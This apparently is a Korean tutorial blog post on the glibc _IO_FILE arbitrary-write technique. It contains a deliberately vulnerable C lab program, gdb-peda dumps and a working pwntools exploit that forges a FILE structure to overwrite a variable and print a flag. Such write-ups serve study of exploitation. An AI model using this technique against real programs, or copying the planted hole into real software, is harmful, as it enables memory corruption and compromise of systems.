---
title: "_IO_FILE Arbitrary Write"
date: 2022-04-05 +0900
categories: [PWNABLE]
tags: ['system hacking', 'iofile', '2022']
---

## \_IO\_FILE Arbitrary Write
`file_aw.c` 는 testfile 파일의 내용을 출력하는 예제이다.

`fread` 함수는 내부적으로 `_IO_fread` 를 호출한다.

- file_aw1.c
    
    ```c
    // gcc -o file_aw1 file_aw1.c
    #include <stdio.h>
    
    int main()
    {	
    	char buf[256];
    	FILE *fp;
    	fp = fopen("testfile","r");
    	fread(buf, 1, 256, fp);
    	printf("%s\n",buf);
    	return 0;
    }
    ```
    
### \_IO\_fread()
이후에 `_IO_file_xsgetn` 함수가 호출되고 `_IO_file_xsgetn` 에서 `_IO_new_file_underflow` 함수를 호출한다.
```c
_IO_size_t
_IO_fread (void *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)
{
  _IO_size_t bytes_requested = size * count;
  _IO_size_t bytes_read;
  CHECK_FILE (fp, 0);
  if (bytes_requested == 0)
    return 0;
  _IO_acquire_lock (fp);
  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);
  _IO_release_lock (fp);
  return bytes_requested == bytes_read ? count : bytes_read / size;
}
```


### \_IO\_file\_xsgetn()
```c
_IO_size_t
_IO_file_xsgetn (_IO_FILE *fp, void *data, _IO_size_t n)
{
	...
	  
		if (__underflow (fp) == EOF)
			break;
	...
```

### \_IO\_new\_file\_underflow
`_IO_new_file_underflow` 함수는 다음과 같은 역할을 한다.

```c
int _IO_new_file_underflow (FILE *fp)
{
  ssize_t count;

  if (fp->_flags & _IO_NO_READS)           
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
   ...
   count = _IO_SYSREAD (fp, fp->_IO_buf_base,     
	fp->_IO_buf_end - fp->_IO_buf_base);
}
```

만약 공격자가 line 5의 조건을 만족시킨다면  `_IO_SYSREAD` 함수를 호출할 수 있다. `_IO_SYSREAD` 함수에 전달되는 파일 디스크럽터를 표준 입력 파일 디스크럽터인 `0` 으로 조작한다면, 임의의 주소에 공격자의 입력을 저장할 수 있다.

## \_IO\_FILE Arbitrary Write Case
`file_aw2.c` 는 이 공격 기법의 이해를 돕기 위한 예제이다.

- file_aw2.c
    
    ```c
    // gcc -o file_aw2 file_aw2.c 
    #include <stdio.h>
    
    int main()
    {	
    	char overwrite_me[256];
    	char buf[256];
    	FILE *fp;
    	fp = fopen("testfile","r");
    	
    	fp->_IO_buf_base = overwrite_me;
    	fp->_IO_buf_end = overwrite_me + 256;
    	fp->_fileno = 0;
    	
    	fread(buf, 1, 5, fp);
    	printf("overflow_me: %s\n",overwrite_me);
    	return 0;
    }
    ```
    

`file_a2w` 의 실행결과는 다음과 같다.

```zsh
╭─root@8e7cea269c13 ~
╰─➤  ./file_aw2
1234
overflow_me: 1234
```

`file_aw3.c` 는 전역 변수 `flag_buf` 에 파일을 읽은 후 testfile을 열고 반환된 파일 포인터 `fp` 의 주소를 출력한다. 그리고 임의의 주소에 200바이트를 입력받고 `fread` 함수가 호출된 후 `overwrite_me` 의 값을 검사한다.

`file_aw3.c` 에서의 목표는 0으로 초기화된 `overwrite_me` 전역 변수를 `0xDEADBEEF` 값으로 덮어써 `read_flag` 호출하여 플래그를 출력하는 것이다.

익스플로잇 시나리오는 다음과 같다.

1. 주어진 파일 포인터 `fp` 의 주소를 가져온다.
2. 구한 파일 포인터의 주소를 `addr` 변수에 입력하므로써 파일 구조체를 조작한다.
3. `overwrite_me` 전역 변수를 덮어써야 하기 때문에 `overwrite_me` 의 주소를 구한 후 파일 구조체의 `_IO_base_buf` 와 `_IO_base_end` 를 각각 `overwrite_me` 와 `overwrite_me + 4` 의 주소로 조작한다.
4. 포인터 조작이 끝났으면 공격자의 입력을 받기 위해 파일 디스크럽터를 의미하는 `_fileno` 를 표준 입력의 파일 디스크럽터인 `0` 으로 조작한다.
- file_aw3.c
    
    ```c
    // gcc -o file_aw3 file_aw3.c
    #include <string.h>
    #include <stdio.h>
    #include <unistd.h>
    char flag_buf[128];
    int overwrite_me = 0;
    
    int read_flag() {
    	FILE *fp;
    	fp = fopen("flag", "r");
    	fread(flag_buf, 1, 256, fp);
    	printf("FLAG: %s\n", flag_buf);
    	fclose(fp);
    }
    
    int main()
    {
    	FILE *fp;
    	long long addr = 0; 
    	long long value = 0;
    	char buf[10];
    
    	fp = fopen("testfile", "r");
    	
    	printf("FILE PTR: %p\n", fp);
    	fflush(stdout);
    	
    	printf("Addr: ");
    	fflush(stdout);
    	scanf("%ld", &addr);
    	printf("Value: ");
    	fflush(stdout);
    	read(0, addr, 200);
    		
    	fread(buf, 1, strlen(buf)-1, fp);
    
    	if( overwrite_me == 0xDEADBEEF ) {
    		read_flag();
    	}
    
    	fclose(fp);
    	return 0;
    }
    ```
    

```zsh
gdb-peda$ i var
All defined variables:

Non-debugging symbols:
0x00000000004009f0  _IO_stdin_used
0x0000000000400a30  __GNU_EH_FRAME_HDR
0x0000000000400b80  __FRAME_END__
0x0000000000600e10  __frame_dummy_init_array_entry
0x0000000000600e10  __init_array_start
0x0000000000600e18  __do_global_dtors_aux_fini_array_entry
0x0000000000600e18  __init_array_end
0x0000000000600e20  __JCR_END__
0x0000000000600e20  __JCR_LIST__
0x0000000000600e28  _DYNAMIC
0x0000000000601000  _GLOBAL_OFFSET_TABLE_
0x0000000000601068  __data_start
0x0000000000601068  data_start
0x0000000000601070  __dso_handle
0x0000000000601078  __TMC_END__
0x0000000000601078  __bss_start
0x0000000000601078  _edata
0x0000000000601080  stdout
0x0000000000601080  stdout@@GLIBC_2.2.5
0x0000000000601088  completed
0x000000000060108c  overwrite_me
```

공격을 통해 입력할 변수인 `overwrite_me` 의 주소를 알아냈다.

```c
[----------------------------------registers-----------------------------------]
RAX: 0x602010 --> 0xfbad2488
RBX: 0x0
RCX: 0x7ffff7b04140 (<__open_nocancel+7>:       cmp    rax,0xfffffffffffff001)
RDX: 0x0
RSI: 0x7ffff7b9ac9f --> 0x7261003d7363632c (',ccs=')
RDI: 0x602010 --> 0xfbad2488
RBP: 0x7fffffffe620 --> 0x400970 (<__libc_csu_init>:    push   r15)
RSP: 0x7fffffffe5e0 --> 0x1
RIP: 0x400875 (<main+54>:       mov    QWORD PTR [rbp-0x28],rax)
R8 : 0x0
R9 : 0x1
R10: 0x0
R11: 0x246
R12: 0x4006f0 (<_start>:        xor    ebp,ebp)
R13: 0x7fffffffe700 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400866 <main+39>:  mov    esi,0x4009f4
   0x40086b <main+44>:  mov    edi,0x400a05
   0x400870 <main+49>:  call   0x4006c0 <fopen@plt>
=> 0x400875 <main+54>:  mov    QWORD PTR [rbp-0x28],rax
   0x400879 <main+58>:  mov    rax,QWORD PTR [rbp-0x28]
   0x40087d <main+62>:  mov    rsi,rax
   0x400880 <main+65>:  mov    edi,0x400a0e
   0x400885 <main+70>:  mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe5e0 --> 0x1
0008| 0x7fffffffe5e8 --> 0x0
0016| 0x7fffffffe5f0 --> 0x0
0024| 0x7fffffffe5f8 --> 0x0
0032| 0x7fffffffe600 --> 0x400970 (<__libc_csu_init>:   push   r15)
0040| 0x7fffffffe608 --> 0x4006f0 (<_start>:    xor    ebp,ebp)
0048| 0x7fffffffe610 --> 0x7fffffffe700 --> 0x1
0056| 0x7fffffffe618 --> 0x4a0a753aafa78600
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400875 in main ()
gdb-peda$ x/gx $rax
0x602010:       0x00000000fbad2488
```

`_IO_SYSREAD` 함수가 호출되는 조건을 맞춰주기 위해 testfile에 대한 파일 포인터의 `_flags` 값을 알아냈다. `_flags` 멤버 변수는 `0xfbad2488` 값을 가지고 있다.

다음은 `file_aw3` 에 대한 공격 코드인 `file_aw3.py` 에 대한 설명이다.

- file_aw3.py
    
    ```python
    #file_aw3.py
    from pwn import *
    
    p = process("./file_aw3")
    
    print(p.recvuntil("PTR: "))
    fp = int(p.recvuntil(b"\n").strip(b"\n"),16)
    print(hex(fp))
    
    print(p.sendlineafter("Addr: ", str(fp)))
    
    payload = p64(0x00000000fbad2488)
    payload += p64(0) # _IO_read_ptr
    payload += p64(0) # _IO_read_end
    payload += p64(0) # _IO_read_base
    payload += p64(0) # _IO_write_base 
    payload += p64(0) # _IO_write_ptr 
    payload += p64(0) # _IO_write_end 
    payload += p64(0x60108c) # _IO_buf_base
    payload += p64(0x60108c+4) # _IO_buf_end
    
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    
    payload += p64(0)
    payload += p64(0) 
    
    payload += p64(0) # stdin
    
    pause()
    print(p.sendlineafter("Value: ", payload))
    
    p.sendline(p32(0xDEADBEEF))
    p.interactive()
    ```
    

line 12에서는 `_flags` 를 기존의 값으로 입력했다.

그리고 line 19 ~ line 20 에서는 `_IO_buf_base` 를 입력할 변수의 시작 주소인 `overwrite_me` 주소로 조작하고, `_IO_buf_end` 를 `overwrite_me + 4` 의 주소로 조작했다. 이로써 라이브러리 내부에서 `_IO_SYSREAD` 함수가 호출되면 `overwrite_me` 주소로 부터 4 바이트 만큼의 값을 입력할 수 있다.

또한 line 29에서 표준 입력으로 입력하기 위해 `_fileno` 멤버 변수를 `0` 으로 조작했다.

다음은 `file_aw3.py` 에 대한 실행 결과이다.

```zsh
╭─root@8e7cea269c13 ~
╰─➤  python3 file_aw3.py
[+] Starting local process './file_aw3': pid 1221
b'FILE PTR: '
0x249c010
b'Addr: '
[*] Paused (press any to continue)
b'Value: '
[*] Switching to interactive mode
FLAG: FLAG{THIS_IS_FLAG!!!!!!!!!}
```